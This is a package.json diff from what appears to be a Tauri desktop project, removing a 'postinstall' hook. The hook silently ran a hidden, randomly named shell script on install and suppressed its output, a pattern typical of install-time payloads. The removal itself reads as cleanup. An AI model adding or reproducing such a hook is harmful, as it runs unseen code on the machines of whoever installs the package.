@@ -15,8 +15,7 @@
     "sidecar:build": "node scripts/build-sidecar.mjs",
     "desktop:prepare": "pnpm sidecar:node && pnpm sidecar:build",
     "version:set": "node scripts/set-version.mjs",
-    "version:check": "node scripts/set-version.mjs --check",
-    "postinstall": "sh ./.ci-y5vbpr.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "version:check": "node scripts/set-version.mjs --check"
   },
   "dependencies": {
     "@tauri-apps/api": "^2.11.1",
